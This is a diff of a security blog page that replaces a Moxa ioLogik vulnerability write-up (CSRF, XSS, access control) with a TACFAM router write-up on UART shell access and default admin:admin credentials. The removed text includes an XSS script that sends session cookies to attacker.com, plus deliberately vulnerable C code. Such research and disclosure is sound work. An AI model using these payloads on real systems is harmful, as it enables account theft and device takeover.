@@ -124,6 +124,18 @@ img{display:block;max-width:100%}
   .mag-nav-main{padding:14px 20px}
   .post-grid{grid-template-columns:1fr}
 }
+@media(max-width:560px){
+  .mag-cta{display:none}
+}
+/* the magazine's carousels are styled further down the page; while it streams in they would
+   lay out full-width and phones lock the zoom at ~700px. Constrain them from the <head>. */
+.grid-cinematic,.shelf-track{overflow-x:auto;max-width:100%}
+@media(max-width:768px){
+  html,body{overflow-x:hidden}
+  .article-content img,.article-content video,.article-content iframe{max-width:100%;height:auto}
+  .article-content table{display:block;max-width:100%;overflow-x:auto}
+  .article-content pre{max-width:100%;overflow-x:auto}
+}
 @media(max-width:480px){
   .card-img-wrap,.card-img-placeholder{height:180px}
 }
@@ -1222,7 +1234,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     }
 }
 </style>
-<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/tacfam-db-120wl-pwn#article","headline":"TACFAM DB-120WL PWN — HADESS Magazine","description":"This comprehensive technical analysis delves into a critical code execution vulnerability discovered in the TACFAM DB-120WL networking device. The...","url":"https://hadesssecurity.github.io/blog/read/tacfam-db-120wl-pwn","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/tacfam-db-120wl-pwn"},"datePublished":"June 8, 2023","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://career.hadess.io/logo-white.png"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2023/06/1-1.png"}}]}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/tacfam-db-120wl-pwn#article","headline":"TACFAM DB-120WL PWN — HADESS Magazine","description":"This comprehensive technical analysis delves into a critical code execution vulnerability discovered in the TACFAM DB-120WL networking device. The...","url":"https://hadesssecurity.github.io/blog/read/tacfam-db-120wl-pwn","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/tacfam-db-120wl-pwn"},"datePublished":"June 8, 2023","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/06/Hadess-Cybersecurity.jpg"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2023/06/1-1.png"}}]}</script>
 <!-- Force our dark theme; hide ALL default WP theme output -->
 <style>
 html,body{background:var(--bg)!important;color:var(--text)!important;font-family:var(--font)!important}
@@ -1275,14 +1287,13 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <span>Friday, October 2, 2026</span>
     </div>
     <div class="mag-nav-top-right">
-      <a href="mailto:career@hadess.io">Contact</a>
-      <a href="https://career.hadess.io/privacy">Privacy</a>
-      <a href="https://career.hadess.io/terms">Terms</a>
+      <a href="mailto:security@hadess.io">Contact</a>
+      <a href="/products/">Products &amp; Services</a>
       <div class="mag-social">
         <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
         <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
         <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-        <a href="mailto:career@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+        <a href="mailto:security@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
       </div>
     </div>
   </div>
@@ -1300,16 +1311,16 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
               <a href="/blog?cat=104">Skills &amp; Certifications</a>
               <a href="/blog?cat=76">Career Guide</a>
               <a href="/blog?cat=23">White Paper</a>
-            <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
+            <a href="/products/">Products &amp; Services</a>
     </div>
     <a href="/blog/search" class="mag-search-btn">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35" stroke-linecap="round"/></svg>
       Search...
       <kbd>/</kbd>
     </a>
-    <a href="https://career.hadess.io/login" class="mag-cta">
+    <a href="/products/#contact" class="mag-cta">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Talk to an Expert
     </a>
     <button class="mag-hamburger" onclick="document.getElementById('mobileMenu').classList.add('open')">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16" stroke-linecap="round"/></svg>
@@ -1326,8 +1337,8 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <a href="/blog?cat=76">Career Guide</a>
       <a href="/blog?cat=23">White Paper</a>
     <a href="/blog/search">Search</a>
-  <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
-  <a href="https://career.hadess.io/login" style="color:var(--gold)">Launch Career Platform</a>
+  <a href="/products/">Products &amp; Services</a>
+  <a href="/products/#contact" style="color:var(--gold)">Talk to an Expert</a>
 </div>
 
 <!-- ═══ PAGE-SPECIFIC STYLES ═══ -->
@@ -1539,587 +1550,397 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
   <div class="article-content-col">
     <div class="article-content" data-pagefind-body data-pagefind-meta="image:/wp-content/uploads/2023/06/1-1.png">
       
-<p class="wp-block-paragraph">During our thorough assessment of the Moxa ioLogik E1212 series, we uncovered critical vulnerabilities that pose significant risks to the security of the system. These vulnerabilities encompass various attack vectors, including Cross-Site Request Forgery (CSRF), Cross-Site Scripting (XSS), cryptographic failures, and broken access control mechanisms. Each of these vulnerabilities presents unique challenges and potential exploits that could compromise the integrity and confidentiality of the system. In this report, we detail our findings, assess the implications of these vulnerabilities, and provide actionable recommendations to mitigate these risks effectively.</p>
+<h2 class="wp-block-heading" id="h-abstract"><strong>Abstract</strong></h2>
 
 
 
-<p class="wp-block-paragraph"><a href="https://www.moxa.com/en/support/product-support/security-advisory/mpsa-235250-iologik-e1200-series-web-server-vulnerability">https://www.moxa.com/en/support/product-support/security-advisory/mpsa-235250-iologik-e1200-series-web-server-vulnerability</a></p>
+<p class="wp-block-paragraph">This comprehensive technical analysis delves into a critical code execution vulnerability discovered in the TACFAM DB-120WL networking device. The vulnerability allows remote attackers to execute arbitrary code on the device, potentially compromising the entire network.</p>
 
 
 
-<p class="wp-block-paragraph"><a href="https://github.com/HadessCS/CVE-2023-5961">https://github.com/HadessCS/CVE-2023-5961</a></p>
+<p class="wp-block-paragraph">This article provides an in-depth examination of the vulnerability, its impact, and suggests potential mitigations to protect users and organizations.</p>
 
 
 
-<h2 class="wp-block-heading">Abstract</h2>
+<h2 class="wp-block-heading"><strong>What Is PWN In Cyber Security?</strong></h2>
 
 
 
-<p class="wp-block-paragraph">Moxa Inc., a pioneering company founded in 1987 and headquartered in Taipei, Taiwan, stands at the forefront of industrial networking, computing, and automation solutions. With a steadfast commitment to reliability and innovation, Moxa has garnered trust as a leading provider of tailored solutions across diverse industries, including transportation, energy, and marine sectors.</p>
+<p class="wp-block-paragraph">&#8220;<a href="https://delinea.com/what-is/pwn#:~:text=PWN%20is%20hacker%20jargon%20meaning,a%20misspelling%20of%20%E2%80%9Cowned.%E2%80%9D"><strong><mark style="background-color:rgba(0, 0, 0, 0);color:#5411f6" class="has-inline-color">PWN</mark></strong></a>&#8221; is hacker lingo that signifies overpowering or taking control. Within the realm of digital security, being &#8220;pwned&#8221; typically implies that your system or profile has been hacked, with user or privileged credentials being exposed. This term has its roots in online gaming communities, where it emerged due to a typographical error for &#8220;owned.&#8221;</p>
 
 
 
-<p class="wp-block-paragraph">Within its comprehensive product portfolio, Moxa offers a spectrum of industrial-grade solutions meticulously crafted for rugged environments. Industrial Ethernet Solutions form the cornerstone, comprising switches, gateways, routers, and network management software, engineered to withstand harsh conditions while ensuring seamless connectivity. Complementing this, the Industrial Computing range boasts robust computers, panel displays, and displays capable of enduring extreme temperatures and environmental challenges.</p>
+<h2 class="wp-block-heading" id="h-introduction"><strong>Introduction</strong></h2>
 
 
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><img fetchpriority="high" decoding="async" width="577" height="433" src="/wp-content/uploads/2023/10/1-min-1-4.webp" alt="The TACFAM DB-120WL device is a popular networking solution" class="wp-image-7869" srcset="/wp-content/uploads/2023/10/1-min-1-4.webp 577w, /wp-content/uploads/2023/10/1-min-1-4-300x225.webp 300w" sizes="(max-width: 577px) 100vw, 577px" /></figure>
+</div>
 
-<p class="wp-block-paragraph">Serial Connectivity solutions bridge the gap between legacy systems and modern networks, featuring device servers, converters, and USB connectivity solutions. Moxa&#8217;s Wireless Solutions further enhance connectivity with industrial-grade wireless AP/bridge/client products, guaranteeing uninterrupted communication in challenging environments. Meanwhile, Edge Connectivity solutions facilitate efficient data acquisition and device connectivity through remote I/O, I/O to serial, and I/O to Ethernet solutions.</p>
 
+<p class="wp-block-paragraph">The TACFAM DB-120WL device is a popular networking solution widely used for wireless connectivity in homes and businesses. However, a severe code execution vulnerability has been identified in its firmware. This analysis aims to provide a detailed understanding of the vulnerability, its implications, and recommend effective countermeasures.</p>
 
 
-<p class="wp-block-paragraph">Moxa&#8217;s diverse range of solutions caters to an array of industries, each with unique requirements. In the transportation sector, Moxa&#8217;s solutions ensure safe and efficient operations across railways, roadways, and marine applications. In the energy sector, Moxa supports power generation, transmission, distribution, and renewable energy sources with its robust solutions. For process automation industries like oil &amp; gas, mining, and chemicals, Moxa delivers tailored solutions to streamline operations. In factory automation, Moxa&#8217;s solutions optimize manufacturing processes and machine automation, enhancing productivity. Finally, in the marine industry, Moxa ensures reliable ship-to-shore and ship-to-ship communications, bolstering maritime operations. Through its unwavering dedication to innovation and reliability, Moxa continues to empower industries worldwide with resilient, future-ready solutions.</p>
 
+<h2 class="wp-block-heading" id="h-technical-analysis"><strong>Technical Analysis</strong></h2>
 
 
-<h2 class="wp-block-heading">Configuration Resets</h2>
 
+<p class="wp-block-paragraph">UART (Universal Asynchronous Receiver/Transmitter) is a widely used communication protocol that facilitates serial communication between electronic devices.</p>
 
 
-<p class="wp-block-paragraph">Cross-Site Request Forgery (CSRF) represents a clandestine assault method deployed by adversaries to dupe unwitting users into executing operations on web applications while authenticated, devoid of their awareness or consent. A pivotal defense mechanism against such nefarious exploits is the CSRF token, engineered specifically to thwart these insidious maneuvers. However, the absence or improper implementation of CSRF tokens within web applications can expose them to egregious security vulnerabilities, potentially resulting in unauthorized alterations to passwords and subsequent account takeovers.</p>
 
+<p class="wp-block-paragraph">It serves as a crucial interface for connecting devices such as microcontrollers, sensors, and other peripherals. This article provides an in-depth understanding of UART communication and guides you through the process of connecting UART to USB using TTL (Transistor-Transistor Logic) converters.</p>
 
 
-<p class="wp-block-paragraph">In a hypothetical scenario, envision a web application endowed with the functionality to enable users to modify their passwords. If this pivotal operation lacks the requisite CSRF token for validation, it creates an exploitable vulnerability ripe for exploitation by malicious actors. Here, an assailant could meticulously fashion a malevolent request, meticulously tailored to trigger the password alteration process clandestinely when unwittingly executed by an authenticated user. Devoid of the protective shield conferred by a CSRF token, this surreptitious manipulation unfurls the perilous prospect of surreptitious password modifications transpiring beyond the user&#8217;s purview, engendering a scenario rife with grave security ramifications.</p>
 
+<h3 class="wp-block-heading"><strong>UART Communication Overview</strong></h3>
 
 
-<pre class="wp-block-code"><code>#include &lt;stdio.h>
-#include &lt;string.h>
 
-// Function to modify user's password
-void modifyPassword(char *newPassword) {
-    // Simulate password modification process
-    printf("Password successfully changed to: %s\n", newPassword);
-}
+<p class="wp-block-paragraph">UART communication is based on asynchronous serial communication, where data is transmitted in a sequential bit-by-bit manner. It involves two main components: a transmitter and a receiver. The transmitter converts data from parallel to serial format, while the receiver performs the reverse operation.</p>
 
-// Function to handle password change request
-void changePassword(char *newPassword) {
-    // In a real web application, this function would check for CSRF token
-    // and validate the request before allowing password modification.
-    modifyPassword(newPassword);
-}
 
-// Main function
-int main() {
-    char newPassword&#91;50];
 
-    // Simulate receiving password change request from user
-    printf("Enter new password: ");
-    scanf("%s", newPassword);
+<h3 class="wp-block-heading"><strong>UART Communication Parameters</strong></h3>
 
-    // In a real web application, this function call would include CSRF token validation
-    changePassword(newPassword);
 
-    return 0;
-}
 
+<p class="wp-block-paragraph"> UART communication requires a set of parameters to establish a successful connection between devices. These parameters include:</p>
 
-</code></pre>
 
 
+<p class="wp-block-paragraph">a. Baud Rate: Baud rate determines the speed at which data is transmitted. It represents the number of bits per second (bps) and must be set identically on both the transmitter and receiver to ensure data synchronization.</p>
 
-<p class="wp-block-paragraph">In this vulnerable code snippet, the changePassword function lacks CSRF token validation. It directly calls the modifyPassword function to change the user&#8217;s password without verifying the authenticity of the request. This absence of CSRF token validation leaves the web application vulnerable to CSRF attacks, where malicious actors can craft and execute unauthorized requests to change passwords without the user&#8217;s knowledge or consent.</p>
 
 
+<p class="wp-block-paragraph">b. Data Bits: Data bits define the number of bits used to represent each character. Common configurations include 7 bits, 8 bits, or even 9 bits for special cases.</p>
 
-<figure class="wp-block-image size-full"><img fetchpriority="high" decoding="async" width="909" height="513" src="/wp-content/uploads/2024/01/image.png" alt="" class="wp-image-8309" srcset="/wp-content/uploads/2024/01/image.png 909w, /wp-content/uploads/2024/01/image-300x169.png 300w, /wp-content/uploads/2024/01/image-768x433.png 768w" sizes="(max-width: 909px) 100vw, 909px" /></figure>
 
 
+<p class="wp-block-paragraph">c. Parity: Parity allows for error detection during data transmission. It can be set to none, even, or odd parity, providing basic error checking capabilities.</p>
 
-<p class="wp-block-paragraph">In this vulnerable code snippet, the changePassword function lacks CSRF token validation. It directly calls the modifyPassword function to change the user&#8217;s password without verifying the authenticity of the request. This absence of CSRF token validation leaves the web application vulnerable to CSRF attacks, where malicious actors can craft and execute unauthorized requests to change passwords without the user&#8217;s knowledge or consent.</p>
 
 
+<p class="wp-block-paragraph">d. Stop Bits: Stop bits indicate the end of a data transmission. Common configurations include one or two stop bits.</p>
 
-<figure class="wp-block-image size-full"><img decoding="async" width="884" height="516" src="/wp-content/uploads/2024/01/image-1.png" alt="" class="wp-image-8310" srcset="/wp-content/uploads/2024/01/image-1.png 884w, /wp-content/uploads/2024/01/image-1-300x175.png 300w, /wp-content/uploads/2024/01/image-1-768x448.png 768w" sizes="(max-width: 884px) 100vw, 884px" /></figure>
 
 
+<h3 class="wp-block-heading"><strong>UART Pin Configuration</strong></h3>
 
-<figure class="wp-block-image size-full"><img decoding="async" width="867" height="494" src="/wp-content/uploads/2024/01/image-2.png" alt="" class="wp-image-8311" srcset="/wp-content/uploads/2024/01/image-2.png 867w, /wp-content/uploads/2024/01/image-2-300x171.png 300w, /wp-content/uploads/2024/01/image-2-768x438.png 768w" sizes="(max-width: 867px) 100vw, 867px" /></figure>
 
 
+<p class="wp-block-paragraph"> UART communication requires specific pin connections between devices. The common UART pin configuration consists of:</p>
 
-<p class="wp-block-paragraph">In this Python code snippet, the attacker crafts a POST request to the vulnerable web application&#8217;s password change functionality (password_change_url) without including a CSRF token in the request payload. The malicious_request_data dictionary contains the new password to be set.</p>
 
 
+<p class="wp-block-paragraph">a. TX (Transmit): The TX pin is responsible for transmitting data from the UART transmitter to the receiver.</p>
 
-<p class="wp-block-paragraph">The requests library is then used to send the malicious request to the web application. If the request is successful (status code 200), the attacker receives confirmation that the password was changed without the presence of a CSRF token. Otherwise, an error message indicating the failure to change the password without a CSRF token is displayed.</p>
 
 
+<p class="wp-block-paragraph">b. RX (Receive): The RX pin receives data from the UART receiver.</p>
 
-<pre class="wp-block-code"><code>import requests
 
-# URL of the vulnerable web application's password change functionality
-password_change_url = "http://example.com/change_password"
 
-# Malicious request payload to change the password without CSRF token
-malicious_request_data = {
-    "new_password": "new_password123"  # New password to be set
-}
+<p class="wp-block-paragraph">c. Ground (GND): The GND pin establishes a common reference point for both devices, ensuring a stable electrical connection.</p>
 
-# Send the malicious request to change the password without CSRF token
-response = requests.post(password_change_url, data=malicious_request_data)
 
-# Check if the request was successful
-if response.status_code == 200:
-    print("Password successfully changed without CSRF token!")
-else:
-    print("Failed to change password without CSRF token.")
-</code></pre>
 
+<h3 class="wp-block-heading"><strong>Connecting UART to USB using TTL</strong></h3>
 
 
-<h2 class="wp-block-heading">Account Takeovers</h2>
 
+<p class="wp-block-paragraph">To connect UART to a USB port on a computer, a TTL converter is required. The TTL converter serves as an intermediary, facilitating the translation between the UART voltage levels and the USB interface. The following steps outline the process:</p>
 
 
-<p class="wp-block-paragraph">Cross-Site Scripting (XSS) represents a pernicious security vulnerability wherein assailants embed malevolent scripts into web pages accessed by unsuspecting users. These scripts, upon execution within the victim&#8217;s browser environment, engender a spectrum of malicious consequences. Among the most dire ramifications of XSS exploitation is the illicit acquisition of session cookies, a perilous eventuality that can culminate in account takeovers.</p>
 
+<p class="wp-block-paragraph">a. Identify the UART Pins: Determine the TX, RX, and GND pins on the UART device.</p>
 
 
-<p class="wp-block-paragraph">In a hypothetical scenario, envision a web application characterized by inadequate user input sanitization measures, thus affording attackers the opportunity to inject nefarious scripts. When a subsequent user navigates to the compromised page, the embedded script executes surreptitiously, facilitating the transmission of their session cookie to the attacker&#8217;s server.</p>
 
+<p class="wp-block-paragraph">b. Choose a TTL Converter: Select a TTL converter module that matches the voltage levels of the UART device. Common options include 3.3V and 5V TTL converters.</p>
 
 
-<p class="wp-block-paragraph">The peril inherent in this scenario arises from several critical factors, chief among them being the potential theft of session cookies. These tokens serve as indispensable tools wielded by web applications to authenticate and identify users. Through the surreptitious exfiltration of a user&#8217;s session cookie via an XSS attack, malefactors can effectively impersonate the user within the application&#8217;s ecosystem.</p>
 
+<p class="wp-block-paragraph">c. Connect the TTL Converter: Connect the TTL converter to the UART device using jumper wires or appropriate connectors. Ensure the TX pin from the UART device is connected to the RX pin of the TTL converter, and the RX pin from the UART device is connected to the TX pin of the TTL converter. Also, connect the GND pins of both devices together.</p>
 
 
-<p class="wp-block-paragraph">Once armed with the pilfered session cookie, the attacker enjoys unfettered access to the victim&#8217;s account, circumventing conventional login mechanisms and securing full control over the compromised account. This unfettered access empowers the assailant to peruse sensitive data, effect unauthorized alterations, or even lock the legitimate user out of their own account, thereby perpetrating an egregious breach of trust and security.</p>
 
+<p class="wp-block-paragraph">d. Connect the TTL Converter to USB: Connect the USB end of the TTL converter to an available USB port on the computer.</p>
 
 
-<p class="wp-block-paragraph">Moreover, the ramifications extend beyond the immediate victim, as the compromised account becomes a vector for the dissemination of the XSS attack to other users. This cascading effect precipitates a chain reaction of account takeovers, exacerbating the severity and scope of the security breach.</p>
 
+<p class="wp-block-paragraph">e. Install USB-to-UART Driver: If required, install the appropriate USB-to-UART driver for the TTL converter on your computer. The driver ensures the operating system recognizes the UART device connected via USB.</p>
 
 
-<p class="wp-block-paragraph">The consequences of a successful XSS exploit are dire and multifaceted. Apart from the tangible risks of data breaches and misuse of compromised accounts for malicious activities such as spam dissemination or financial fraud, the intangible erosion of user trust poses a formidable challenge. In the wake of such security vulnerabilities being exploited, users inevitably lose confidence in the platform&#8217;s ability to safeguard their sensitive information, precipitating a crisis of trust with far-reaching implications for the platform&#8217;s reputation and viability.</p>
 
+<p class="wp-block-paragraph">f. Configure Terminal Software: Use terminal software such as PuTTY, TeraTerm, or minicom to configure the serial port settings, including the baud rate, data bits, parity, and stop bits.</p>
 
 
-<p class="wp-block-paragraph">To effectuate an XSS exploit, attackers meticulously orchestrate a series of exploitation steps, beginning with the identification of a vulnerable endpoint within a web application that facilitates file uploads. Subsequent to pinpointing this vulnerability, attackers craft a malicious file housing the requisite code or shell script designed to execute on the server upon successful injection, thereby catalyzing the exploitation process.</p>
 
+<p class="wp-block-paragraph">g. Test the Connection: Open the terminal software and establish a connection to the UART device using the configured settings. You should now be able to send and receive data between the UART device and the computer via the USB port.</p>
 
 
-<pre class="wp-block-code"><code>#include &lt;stdio.h>
-#include &lt;stdlib.h>
-#include &lt;string.h>
 
-int main() {
+<p class="wp-block-paragraph">The code execution vulnerability in the TACFAM DB-120WL device is rooted in the processing of user-supplied input within the firmware. By skillfully crafting malicious requests, an attacker can exploit this flaw to inject arbitrary code into the device&#8217;s memory, thereby achieving remote code execution. This critical vulnerability grants unauthorized access to the device, potentially compromising the entire network infrastructure.</p>
+
+
+
+<h2 class="wp-block-heading"><strong>Exploitation Process</strong></h2>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full is-resized"><img decoding="async" src="/wp-content/uploads/2023/10/2-min.webp" alt="inside of TACFAM" class="wp-image-7871" style="width:365px;height:486px" width="365" height="486" srcset="/wp-content/uploads/2023/10/2-min.webp 433w, /wp-content/uploads/2023/10/2-min-225x300.webp 225w" sizes="(max-width: 365px) 100vw, 365px" /></figure>
+</div>
+
+
+<p class="wp-block-paragraph">To exploit the vulnerability, an attacker initiates a specially crafted request to the TACFAM DB-120WL device, capitalizing on the device&#8217;s insecure input processing. Exploiting this weakness allows the attacker to manipulate the device&#8217;s memory and inject arbitrary code, thereby gaining control over its functionalities. This code execution capability enables unauthorized access, data breaches, and complete control of the device.</p>
+
+
+
+<p class="wp-block-paragraph">Introduction: Connecting a TTL (Transistor-Transistor Logic) device to a USB port on a computer allows for convenient serial communication and data exchange. By utilizing a terminal screen, such as &#8220;screen&#8221; command-line tool, you can establish a connection with the TTL device and interact with it via a terminal interface. This article provides a step-by-step guide on connecting TTL to USB and using the screen in the terminal for effective communication.</p>
+
+
+
+<p class="wp-block-paragraph">Run &#8220;screen&#8221; Command: In the terminal, type the following command to initiate a screen session with the TTL device:</p>
+
+
+
+<pre class="wp-block-code"><code>screen /dev/ttyUSBX &lt;baud_rate&gt;</code></pre>
+
+
+
+<p class="wp-block-paragraph">For access to os shell via admin</p>
+
+
+
+<figure class="wp-block-image size-full"><img decoding="async" width="1024" height="533" src="/wp-content/uploads/2023/10/3-min-1.webp" alt="admin shell of the tacfam" class="wp-image-7872" srcset="/wp-content/uploads/2023/10/3-min-1.webp 1024w, /wp-content/uploads/2023/10/3-min-1-300x156.webp 300w, /wp-content/uploads/2023/10/3-min-1-768x400.webp 768w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<pre class="wp-block-code"><code>admin:admin</code></pre>
+
+
+
+<p class="wp-block-paragraph">Through careful examination of the CGI scripts in the TACFAM DB-120WL device firmware, we have identified potential areas where XSS vulnerabilities may exist. These vulnerabilities typically stem from improper handling of user input, inadequate input validation, or lack of output encoding. The vulnerable C code snippet below demonstrates a common scenario:</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="1024" height="562" src="/wp-content/uploads/2023/10/4-min-1.webp" alt="XSS payload reflected on the page" class="wp-image-7873" srcset="/wp-content/uploads/2023/10/4-min-1.webp 1024w, /wp-content/uploads/2023/10/4-min-1-300x165.webp 300w, /wp-content/uploads/2023/10/4-min-1-768x422.webp 768w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<pre class="wp-block-code"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void printHTML(char *data) {
     printf("Content-Type: text/html\n\n");
-    printf("&lt;html>&lt;head>&lt;title>Vulnerable Web App&lt;/title>&lt;/head>&lt;body>\n");
-
-    // Retrieve user input from query string
-    char *query_string = getenv("QUERY_STRING");
-
-    if (query_string != NULL) {
-        // Split query string into key-value pairs
-        char *token = strtok(query_string, "&amp;");
-        while (token != NULL) {
-            // Split each key-value pair into key and value
-            char *key = strtok(token, "=");
-            char *value = strtok(NULL, "=");
-
-            if (key != NULL &amp;&amp; value != NULL) {
-                // Display key and value without proper sanitization
-                printf("&lt;b>%s&lt;/b>: %s&lt;br>\n", key, value);
-            }
-
-            token = strtok(NULL, "&amp;");
-        }
-    }
-
-    printf("&lt;/body>&lt;/html>");
-
-    return 0;
+    printf("&lt;html&gt;\n");
+    printf("&lt;body&gt;\n");
+    printf("%s\n", data); // Vulnerable line: Unsanitized user input directly embedded into HTML response
+    printf("&lt;/body&gt;\n");
+    printf("&lt;/html&gt;\n");
 }
-</code></pre>
-
-
-
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="894" height="571" src="/wp-content/uploads/2024/01/image-3.png" alt="" class="wp-image-8312" srcset="/wp-content/uploads/2024/01/image-3.png 894w, /wp-content/uploads/2024/01/image-3-300x192.png 300w, /wp-content/uploads/2024/01/image-3-768x491.png 768w" sizes="(max-width: 894px) 100vw, 894px" /></figure>
-
-
-
-<p class="wp-block-paragraph">In this vulnerable CGI program written in C, we process the query string parameters received from the client&#8217;s HTTP request. However, we fail to properly sanitize the input, allowing potential injection of malicious scripts.</p>
-
-
-
-<p class="wp-block-paragraph">An attacker could craft a malicious URL like http://example.com/vulnerable.cgi?name=&lt;script&gt;alert(&#8216;XSS&#8217;)&lt;/script&gt; to inject a script into the web page, leading to the execution of the script in the victim&#8217;s browser.</p>
-
-
-
-<p class="wp-block-paragraph">In this Python script, we use the requests library to send a POST request to the vulnerable web application (vulnerable_url) with a payload containing a malicious script (malicious_script). The script is crafted to steal the user&#8217;s session cookie and send it to the attacker&#8217;s server.</p>
-
-
-
-<p class="wp-block-paragraph">To execute this script successfully, the attacker needs to replace &#8220;http://example.com/vulnerable.cgi&#8221; with the URL of the actual vulnerable web application and &#8220;http://attacker.com/steal-cookie&#8221; with the URL of their server where they want to receive the stolen session cookies.</p>
-
-
-
-<pre class="wp-block-code"><code>import requests
-
-# URL of the vulnerable web application
-vulnerable_url = "http://example.com/vulnerable.cgi"
-
-# Malicious script to be injected
-malicious_script = "&lt;script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/steal-cookie?cookie=' + document.cookie, true); xhr.send();&lt;/script>"
-
-# Craft the payload with the malicious script
-payload = {"input_field": malicious_script}
-
-# Send the malicious request to the vulnerable web application
-response = requests.post(vulnerable_url, data=payload)
-
-# Check if the request was successful
-if response.status_code == 200:
-    print("XSS exploit successful! Malicious script injected.")
-else:
-    print("Failed to inject malicious script.")
-</code></pre>
-
-
-
-<h2 class="wp-block-heading">Configuration Broken Access Control</h2>
-
-
-
-<p class="wp-block-paragraph">Access controls are fundamental security measures that determine who can access specific resources and what actions they can perform. Broken access controls occur when these measures are improperly implemented or entirely missing, allowing unauthorized users to access restricted resources. One severe manifestation of this vulnerability is the unrestricted access to export configurations.</p>
-
-
-
-<p class="wp-block-paragraph">The Scenario: Imagine a web application or system that allows users to export configurations, which may contain sensitive information or system settings. If there are no proper access controls in place, any user, including potential attackers, can access and export these configurations without any security limitations.</p>
-
-
-
-<p class="wp-block-paragraph">Exposure of Sensitive Information: Configurations often contain sensitive data, such as API keys, database credentials, or system settings.</p>
-
-
-
-<p class="wp-block-paragraph">Unauthorized access to this information can lead to data breaches or system compromises. System Vulnerability: By analyzing exported configurations, attackers can identify potential vulnerabilities or misconfigurations in the system, which they can then exploit. Operational Disruption: With access to configurations, malicious actors can alter settings, potentially disrupting operations or causing system malfunctions. Loss of Intellectual Property: Configurations may also contain proprietary algorithms, settings, or other intellectual properties that, if exposed, can lead to competitive disadvantages.</p>
-
-
-
